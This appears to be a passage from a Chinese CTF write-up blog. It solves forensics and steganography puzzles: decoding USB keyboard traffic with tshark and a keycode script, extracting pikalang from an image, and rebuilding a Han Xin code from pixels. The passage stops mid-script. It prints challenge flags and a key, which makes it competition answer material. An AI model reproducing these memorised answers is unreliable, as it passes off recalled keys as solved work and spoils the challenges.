<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817115534278.png" class="" title="image-20220817115534278">

<ol start="4">
<li>得到<code>flag&#123;607f41da-e849-4c0b-8867-1b3c74536cc4&#125;</code></li>
</ol>
<h1 id="国赛-ez-usb"><a href="#国赛-ez-usb" class="headerlink" title="[国赛]ez_usb"></a>[国赛]ez_usb</h1><blockquote>
<p>使用tshark对流量进行处理</p>
<p>winhex转换所得数据</p>
</blockquote>
<h2 id="Wireshark对流量包进行分组"><a href="#Wireshark对流量包进行分组" class="headerlink" title="Wireshark对流量包进行分组"></a>Wireshark对流量包进行分组</h2><blockquote>
<p>usb.addr &#x3D;&#x3D; “2.x.1”</p>
<p>usb.device_address &#x3D;&#x3D; 4&#x2F;8&#x2F;10</p>
</blockquote>
<ol>
<li>分析流量包，发现host为2.10&#x2F;4&#x2F;8对应的info<strong>URB_INTERRUPT</strong>，设置过滤规则，选中并导出相应的pcapng</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">usb.device_address == <span class="number">4</span>/<span class="number">8</span>/<span class="number">10</span></span><br></pre></td></tr></table></figure>

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817151224912.png" class="" title="image-20220817151224912">

<ol start="2">
<li>分离好不同的流量包使用tshark对流量包数据进行处理</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tshark -r 2_x.pcapng -T fields -e usbhid.data | sed <span class="string">&#x27;/^\s*$/d&#x27;</span> &gt; usb_x.txt</span><br></pre></td></tr></table></figure>

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817151528781.png" class="" title="image-20220817151528781">

<ol start="3">
<li>继续处理数据，利用脚本加上<code>：</code>，分别导出文件<code>output_x.txt</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usb_10.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;output_10.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>:</span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure>

<h2 id="使用键盘流量相关脚本对txt文件进行处理"><a href="#使用键盘流量相关脚本对txt文件进行处理" class="headerlink" title="使用键盘流量相关脚本对txt文件进行处理"></a>使用键盘流量相关脚本对txt文件进行处理</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line"> <span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"> <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line"> <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"> <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line"> <span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line"> <span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line"> <span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line"> <span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line"> <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line"> <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line"> <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line"> <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;output_x.txt&#x27;</span>) <span class="comment"># 修改文件名进行运行</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">             flag+=<span class="number">1</span></span><br><span class="line">             output.pop(i)</span><br><span class="line">             <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">         <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">     <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure>

<p>分别对三个文本进行处理，最后2_4没跑出数据，2_8&#x2F;2_10跑出数据</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817154125683.png" class="" title="image-20220817154125683">

<h2 id="16进制-x2F-已知文件头将输出数据转换为压缩包，并解密"><a href="#16进制-x2F-已知文件头将输出数据转换为压缩包，并解密" class="headerlink" title="16进制&#x2F;已知文件头将输出数据转换为压缩包，并解密"></a>16进制&#x2F;已知文件头将输出数据转换为压缩包，并解密</h2><ol>
<li>16进制转换</li>
</ol>
<blockquote>
<p><a href="https://the-x.cn/encodings/Hex.aspx">https://the-x.cn/encodings/Hex.aspx</a></p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817154843391.png" class="" title="image-20220817154843391">

<ol start="2">
<li>winhex</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817155055041.png" class="" title="image-20220817155055041">

<ol start="3">
<li>生成压缩包后，解压，使用所得密钥<code>35c535765e50074a</code>进行解密，得到<code>flag&#123;20de17cc-d2c1-4b61-bebd-41159ed7172d&#125;</code></li>
</ol>
<h1 id="国赛-pikalang"><a href="#国赛-pikalang" class="headerlink" title="[国赛]pikalang"></a>[国赛]pikalang</h1><ol>
<li><code>stegsolve</code>对<code>pika.png</code>进行通道检查</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220921101021224.png" class="" title="image-20220921101021224">

<ol start="2">
<li>提取出来的数据进行base64解密，得到<code>pikalang</code>密文</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220921101119449.png" class="" title="image-20220921101119449">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYSBwaXBpIHBpIHBpcGkgcGkgcGkgcGkgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaXBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpY2h1IHBpY2h1IHBpY2h1IHBpY2h1IGthIGNodSBwaXBpIHBpcGkgcGlwaSBwaXBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIHBpa2FjaHUga2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaWthY2h1IHBpIHBpIHBpa2FjaHUgcGlwaSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIHBpa2FjaHUgcGlwaSBwaSBwaSBwaWthY2h1IHBpY2h1IHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaSBwaWthY2h1IHBpY2h1IGthIHBpa2FjaHUgcGkgcGkgcGkgcGlrYWNodSBrYSBwaWthY2h1IHBpcGkgcGkgcGlrYWNodSBwaWthY2h1IHBpY2h1IHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpIHBpa2FjaHUgcGljaHUgcGlrYWNodSBwaXBpIGthIGthIGthIGthIGthIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBwaWNodSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpa2FjaHUga2EgcGlrYWNodSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaWthY2h1IA==</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>引入第三方库<code>pikalang</code>，最后使用pokeball编写脚本</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import pikalang</span></span><br><span class="line"></span><br><span class="line">sourcecode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pikachu pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka pikachu pi pi pikachu pi pi pikachu pipi pikachu pichu ka ka ka ka ka pikachu pipi pi pi pikachu pichu pi pi pi pikachu ka ka ka pikachu pipi pikachu ka ka ka ka ka pikachu pi pi pi pikachu pichu ka pikachu pi pi pi pikachu ka pikachu pipi pi pikachu pikachu pichu pi pikachu ka ka ka pikachu pi pikachu pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu pipi pi pikachu pichu pikachu pipi ka ka ka ka ka pikachu pi pi pi pi pi pikachu pichu ka ka pikachu pi pi pi pi pikachu ka pikachu ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or use sourcecode = pikalang.load_source(&quot;pika.pokeball&quot;) to load from file</span></span><br><span class="line"></span><br><span class="line">pikalang.evaluate(sourcecode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="网鼎杯-2020-青龙组-虚幻2"><a href="#网鼎杯-2020-青龙组-虚幻2" class="headerlink" title="[网鼎杯 2020 青龙组]虚幻2"></a>[网鼎杯 2020 青龙组]虚幻2</h1><blockquote>
<p>解压缩得到<code>file </code></p>
<p>tools：</p>
<ol>
<li>winhex</li>
<li>中国编码APP</li>
<li>pycharm</li>
</ol>
<p>hint：</p>
<ol>
<li>汉信码</li>
<li>爆破</li>
</ol>
</blockquote>
<ol>
<li>使用<code>winhex</code>发现文件头是PNG，所以把后缀名修改，得到<code>file.png</code></li>
<li>将<code>file.png</code>进行读取，得到<code>01</code>字符串</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 读取像素点</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">36</span>	  <span class="comment">#x坐标</span></span><br><span class="line">y = <span class="number">12</span>	  <span class="comment">#y坐标</span></span><br><span class="line"></span><br><span class="line">im=Image.<span class="built_in">open</span>(<span class="string">&#x27;file.png&#x27;</span>)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#im.show()</span></span><br><span class="line">z=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">        rgb=im.getpixel((i, j))</span><br><span class="line">        <span class="built_in">print</span>(rgb)</span><br><span class="line">        <span class="keyword">if</span>(rgb[<span class="number">0</span>]==<span class="number">0</span>):</span><br><span class="line">            z+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(rgb[<span class="number">0</span>]==<span class="number">255</span>):</span><br><span class="line">            z+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(rgb[<span class="number">1</span>]==<span class="number">0</span>):</span><br><span class="line">            z+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(rgb[<span class="number">1</span>]==<span class="number">255</span>):</span><br><span class="line">            z+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(rgb[<span class="number">2</span>]==<span class="number">0</span>):</span><br><span class="line">            z+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(rgb[<span class="number">2</span>]==<span class="number">255</span>):</span><br><span class="line">            z+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(z)</span><br><span class="line">file.write(z)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>将<code>01</code>字符串写入图片，得到缺失一块的汉信码。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写入成为图片</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">36</span>	  <span class="comment">#x坐标</span></span><br><span class="line">y = <span class="number">36</span>	  <span class="comment">#y坐标</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a=file.read()</span><br><span class="line">z=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">		<span class="built_in">print</span>(a[z])</span><br><span class="line">		<span class="keyword">if</span>(a[z]==<span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">			im.putpixel((i, j), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">		<span class="keyword">elif</span>(a[z]==<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">			im.putpixel((i, j), (<span class="number">0</span>, 